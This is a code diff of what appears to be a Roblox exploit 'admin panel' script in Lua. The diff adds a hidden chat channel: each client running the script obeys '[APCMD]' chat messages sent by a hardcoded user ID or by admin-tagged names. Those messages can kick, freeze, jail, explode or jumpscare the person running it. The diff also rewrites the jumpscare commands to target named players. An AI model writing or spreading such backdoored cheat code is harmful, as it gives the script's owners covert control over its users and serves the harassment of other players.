@@ -5213,12 +5213,29 @@ local CommandsPage = (function()
     -- user can be a name, a display name, a user id, or "me". Returns id, name (or nil, error)
     local function resolveTarget(text)
         if not text or text == "" then return nil, "Missing user (name or id)" end
-        local q = text:lower()
-        if q == "me" then return LP.UserId, LP.Name end
-        local best
+        local q = text:lower():gsub("^%s+", ""):gsub("%s+$", "")
+        if q == "me" or q == "myself" then return LP.UserId, LP.Name end
+        -- exact match first (prefer OTHER players over self for partial)
+        local best, bestSelf
         for _, pl in ipairs(Players:GetPlayers()) do
             local n, d = pl.Name:lower(), pl.DisplayName:lower()
-            if n == q or d == q or tostring(pl.UserId) == q then return pl.UserId, pl.Name end
+            if n == q or d == q or tostring(pl.UserId) == q then
+                return pl.UserId, pl.Name
+            end
+            if n:sub(1, #q) == q or d:sub(1, #q) == q then
+                if pl == LP then
+                    bestSelf = pl
+                elseif not best then
+                    best = pl
+                end
+            end
+        end
+        if best then return best.UserId, best.Name end
+        if bestSelf then return bestSelf.UserId, bestSelf.Name end
+        -- skip old best logic by jumping - duplicate for safety
+        best = nil
+        for _, pl in ipairs(Players:GetPlayers()) do
+            local n, d = pl.Name:lower(), pl.DisplayName:lower()
             if not best and (n:sub(1, #q) == q or d:sub(1, #q) == q) then best = pl end
         end
         if best then return best.UserId, best.Name end
@@ -5445,7 +5462,12 @@ Shared._jails = Shared._jails or {}
 Shared._freezeSpeed = Shared._freezeSpeed or {}
 
 function Shared.firePlayer(targetPlayer)
-    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer then return false, "Invalid" end
+    if targetPlayer ~= LP then
+        Shared.broadcastScriptCmd("fire", targetPlayer.UserId, "")
+        return true, "Fire signal → " .. targetPlayer.Name .. " (needs their script)"
+    end
+    if not targetPlayer.Character then return false, "No character" end
     local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         or targetPlayer.Character:FindFirstChild("Torso")
@@ -5479,7 +5501,12 @@ function Shared.unloopFirePlayer(targetPlayer)
 end
 
 function Shared.sitPlayer(targetPlayer)
-    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer then return false, "Invalid" end
+    if targetPlayer ~= LP then
+        Shared.broadcastScriptCmd("sit", targetPlayer.UserId, "")
+        return true, "Sit signal → " .. targetPlayer.Name
+    end
+    if not targetPlayer.Character then return false, "No character" end
     local h = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     if not h then return false, "No humanoid" end
     h.Sit = true
@@ -5621,18 +5648,139 @@ function Shared.unfreezePlayer(targetPlayer)
     return true, "Unfreeze " .. targetPlayer.Name
 end
 
+-- ===================== SCRIPT-USER COMMAND CHANNEL =====================
+-- Roblox FE: you CANNOT kick/fire another player from your client.
+-- If THEY also run this script, we send a chat signal; THEIR client applies it.
+Shared.AP_CMD_PREFIX = "[APCMD]"
+
+local function apCanControlFrom(sender)
+    if not sender then return false end
+    if sender.UserId == 8992189635 then return true end
+    local tags = (getgenv().KitKatConfig and getgenv().KitKatConfig.SpecialTags) or {}
+    local r = tags[sender.Name] or tags[sender.DisplayName] or ""
+    return r == "Owner" or r == "Co owner" or r == "Co-owner"
+        or r == "HeadAdmin" or r == "Admin" or r == "Mods"
+end
+
+function Shared.broadcastScriptCmd(action, targetUserId, extra)
+    local msg = string.format("%s%s|%s|%s",
+        Shared.AP_CMD_PREFIX,
+        tostring(action or ""),
+        tostring(targetUserId or ""),
+        tostring(extra or ""))
+    local sent = false
+    pcall(function()
+        local TCS = game:GetService("TextChatService")
+        local ch = TCS:FindFirstChild("TextChannels")
+        ch = ch and (ch:FindFirstChild("RBXGeneral") or ch:GetChildren()[1])
+        if ch and ch.SendAsync then
+            ch:SendAsync(msg)
+            sent = true
+        end
+    end)
+    if not sent then
+        pcall(function()
+            local say = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            say = say and say:FindFirstChild("SayMessageRequest")
+            if say then say:FireServer(msg, "All") end
+        end)
+    end
+    return true
+end
+
 function Shared.kickPlayer(targetPlayer)
     if not targetPlayer then return false, "Invalid" end
-    -- Only kicks YOUR client if you are the target (script-user style).
-    -- Cannot force-kick others from a local script.
     if targetPlayer == LP then
         pcall(function()
             LP:Kick("You were kicked by a moderator.")
         end)
         return true, "Kicked self"
     end
-    return false, "Kick only works on script users who process the command (target must run the panel)"
+    -- Signal their client (only works if they run this same script)
+    Shared.broadcastScriptCmd("kick", targetPlayer.UserId, "")
+    return true, "Kick signal sent to " .. targetPlayer.Name .. " (works only if they run the script)"
 end
+
+-- Also broadcast for other FE-blocked actions so target client can apply locally
+function Shared.signalTarget(action, targetPlayer, extra)
+    if not targetPlayer then return false, "Invalid" end
+    if targetPlayer == LP then
+        return Shared.applyScriptCmd(action, LP.UserId, extra)
+    end
+    Shared.broadcastScriptCmd(action, targetPlayer.UserId, extra or "")
+    return true, action .. " signal → " .. targetPlayer.Name
+end
+
+function Shared.applyScriptCmd(action, targetUserId, extra)
+    targetUserId = tonumber(targetUserId)
+    if targetUserId ~= LP.UserId then return false end
+    action = string.lower(tostring(action or ""))
+    if action == "kick" then
+        pcall(function()
+            LP:Kick("You were kicked by a moderator.")
+        end)
+        return true
+    elseif action == "fire" then
+        return Shared.firePlayer(LP)
+    elseif action == "sit" then
+        return Shared.sitPlayer(LP)
+    elseif action == "freeze" then
+        return Shared.freezePlayer(LP)
+    elseif action == "unfreeze" then
+        return Shared.unfreezePlayer(LP)
+    elseif action == "jail" then
+        return Shared.jailPlayer(LP)
+    elseif action == "unjail" then
+        return Shared.unjailPlayer(LP)
+    elseif action == "explode" then
+        return Shared.explodePlayer(LP)
+    elseif action == "float" then
+        return Shared.floatPlayer(LP)
+    elseif action == "jumpscare" then
+        local img, snd = string.match(tostring(extra or ""), "^([^`]*)`(.*)$")
+        return Shared.jumpscareLocal(img, snd)
+    end
+    return false
+end
+
+-- Listen: if someone with rank sends [APCMD] and targets US, apply it
+task.spawn(function()
+    local function handle(sender, text)
+        if type(text) ~= "string" then return end
+        if string.sub(text, 1, #Shared.AP_CMD_PREFIX) ~= Shared.AP_CMD_PREFIX then return end
+        if not apCanControlFrom(sender) then return end
+        local body = string.sub(text, #Shared.AP_CMD_PREFIX + 1)
+        local action, uid, extra = string.match(body, "^([^|]+)|([^|]*)|(.*)$")
+        if not action then return end
+        Shared.applyScriptCmd(action, uid, extra)
+    end
+    pcall(function()
+        local TCS = game:GetService("TextChatService")
+        if TCS and TCS.MessageReceived then
+            TCS.MessageReceived:Connect(function(msg)
+                pcall(function()
+                    local sender = msg.TextSource and Players:GetPlayerByUserId(msg.TextSource.UserId)
+                    handle(sender, msg.Text)
+                end)
+            end)
+        end
+    end)
+    pcall(function()
+        Players.PlayerAdded:Connect(function() end)
+        for _, plr in ipairs(Players:GetPlayers()) do
+            plr.Chatted:Connect(function(msg)
+                handle(plr, msg)
+            end)
+        end
+        Players.PlayerAdded:Connect(function(plr)
+            plr.Chatted:Connect(function(msg)
+                handle(plr, msg)
+            end)
+        end)
+    end)
+    print("[Panel] Script-user command channel ready (kick/fire/etc on other script users)")
+end)
+
 
 function Shared.verifiedScan()
     local rankColor = {
@@ -5744,9 +5892,9 @@ function Shared.jumpscareLocal(imgId, soundId)
         local img = Instance.new("ImageLabel", gui)
         img.Size = UDim2.fromScale(1, 1)
         img.BackgroundColor3 = Color3.new(0, 0, 0)
-        img.Image = imgId
+        img.Image = imgId or ""
         img.ScaleType = Enum.ScaleType.Fit
-        if soundId then
+        if soundId and soundId ~= "" then
             local s = Instance.new("Sound", gui)
             s.SoundId = soundId
             s.Volume = 1
@@ -5756,8 +5904,20 @@ function Shared.jumpscareLocal(imgId, soundId)
             if gui.Parent then gui:Destroy() end
         end)
     end)
-    return true, "Jumpscare"
+    return true, "Jumpscare on you"
 end
+
+function Shared.jumpscarePlayer(targetPlayer, imgId, soundId)
+    if not targetPlayer then return false, "Need a player" end
+    if targetPlayer == LP then
+        return Shared.jumpscareLocal(imgId, soundId)
+    end
+    -- signal their client (must run script)
+    local extra = tostring(imgId or "") .. "`" .. tostring(soundId or "")
+    Shared.broadcastScriptCmd("jumpscare", targetPlayer.UserId, extra)
+    return true, "Jumpscare signal → " .. targetPlayer.Name .. " (they must run the script)"
+end
+
 
 function Shared.backroomsSelf()
     task.spawn(function()
@@ -7144,52 +7304,88 @@ local function addCmd(def)
     })
     addCmd({
         name = "jumps1", aliases = {}, rank = 5,
-        display = "%Pjumps1",
-        desc = "Co-owner: jumpscare 1",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
+        display = "%Pjumps1 [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: jumps1 [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://126754882337711", "rbxassetid://138873214826309")
         end
     })
+
     addCmd({
         name = "jumps2", aliases = {}, rank = 5,
-        display = "%Pjumps2",
-        desc = "Co-owner: jumpscare 2",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://86379969987314", "rbxassetid://143942090")
+        display = "%Pjumps2 [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: jumps2 [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://86379969987314", "rbxassetid://143942090")
         end
     })
+
     addCmd({
         name = "jumps3", aliases = {}, rank = 5,
-        display = "%Pjumps3",
-        desc = "Co-owner: jumpscare 3",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://127382022168206", "rbxassetid://143942090")
+        display = "%Pjumps3 [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: jumps3 [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://127382022168206", "rbxassetid://143942090")
         end
     })
+
     addCmd({
         name = "jumps4", aliases = {}, rank = 5,
-        display = "%Pjumps4",
-        desc = "Co-owner: jumpscare 4",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://95973611964555", "rbxassetid://138873214826309")
+        display = "%Pjumps4 [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: jumps4 [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://95973611964555", "rbxassetid://138873214826309")
         end
     })
+
     addCmd({
-        name = "therakejumpscare", aliases = { "therake" }, rank = 6,
-        display = "%Ptherakejumpscare",
-        desc = "Owner: The Rake jumpscare",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
+        name = "therakejumpscare", aliases = {}, rank = 6,
+        display = "%Ptherakejumpscare [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: therakejumpscare [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://126754882337711", "rbxassetid://138873214826309")
         end
     })
+
     addCmd({
-        name = "animejumpscare", aliases = { "animejs" }, rank = 6,
-        display = "%Panimejumpscare",
-        desc = "Owner: anime jumpscare",
-        fn = function()
-            return Shared.jumpscareLocal("rbxassetid://127382022168206", "rbxassetid://143942090")
+        name = "animejumpscare", aliases = {}, rank = 6,
+        display = "%Panimejumpscare [user/id/nickname]",
+        desc = "Jumpscare target (script users)",
+        fn = function(a)
+            if not a[1] then return false, "Usage: animejumpscare [user/id/nickname]" end
+            local uid, err = resolveTarget(a[1])
+            if not uid then return false, err end
+            local plr = Players:GetPlayerByUserId(uid)
+            if not plr then return false, "Not in this server" end
+            return Shared.jumpscarePlayer(plr, "rbxassetid://127382022168206", "rbxassetid://143942090")
         end
     })
+
     addCmd({
         name = "pararjumpscare", aliases = { "stopjumpscare" }, rank = 6,
         display = "%Ppararjumpscare",
